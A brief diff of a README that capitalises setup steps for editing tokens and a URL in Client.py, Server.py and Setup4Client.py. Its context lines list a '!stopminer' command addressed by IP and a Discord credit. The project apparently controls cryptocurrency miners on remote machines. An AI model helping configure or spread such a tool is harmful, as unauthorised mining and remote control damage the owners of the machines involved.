@@ -22,11 +22,11 @@
 * !stopminer.< ip >             # Stop miner
 
 # How to use
-edit token on Client.py
+Edit token on Client.py
 
-"           " Server.py
+Edit token on Server.py
 
-edit url on Setup4Client.py
+Edit url on Setup4Client.py
 
 # Credits
 batu.sh#9675 - https://discord.gg/vCdPTjD6rZ
